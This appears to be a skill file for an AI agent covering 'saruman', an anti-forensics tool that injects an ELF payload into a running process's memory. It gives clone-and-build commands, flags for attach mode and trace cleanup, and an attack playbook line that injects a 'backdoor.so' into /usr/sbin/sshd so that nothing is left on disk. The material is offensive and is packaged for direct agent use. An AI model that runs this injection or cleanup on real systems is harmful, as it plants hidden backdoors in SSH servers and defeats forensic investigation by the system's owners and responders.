---
name: saruman-anti-forensic
description: "saruman: Injects ELF into memory to evade disk forensics. Signals: trace cleanup, anti-forensics, attach mode, cleanup traces on exit."
zh-signals: "saruman: ELF 内存注入规避磁盘取证。信号:痕迹清理,反取证,附加模式,退出时清理痕迹。"
when-to-use: >-
  Use for anti-forensic scenarios that require in-memory ELF injection into a
  running process to avoid leaving disk artifacts.
---

# saruman

- Attack Category: C20 Anti-Forensics and Trace Cleanup
- Upstream Repository: https://github.com/elfmaster/saruman
- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/elfmaster/saruman && cd saruman && make
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./saruman target_bin payload.so` | Dynamically inject the ELF into the target process memory |
| `-p pid` | Attach mode |
| `--clean` | Clean up traces on exit |

## Attack Scenario Playbook

### ELF memory injection to evade disk forensics

```bash
./saruman /usr/sbin/sshd ./backdoor.so  # Executes in the target process after injection, leaving no file on disk
```

## Notes

PoC-grade tool; modern kernel hardening (ptrace_scope/SELinux) usually requires weakening protections, so it is more valuable for research than for live engagements.
